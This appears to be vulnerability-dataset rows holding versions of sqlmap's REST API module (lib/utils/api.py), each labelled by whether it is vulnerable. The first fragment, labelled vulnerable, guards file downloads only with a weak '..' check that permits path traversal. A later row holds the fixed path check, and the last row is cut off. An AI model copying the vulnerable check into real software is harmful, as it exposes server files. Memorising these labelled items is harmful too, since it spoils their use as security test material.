    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1
54,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0
55,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
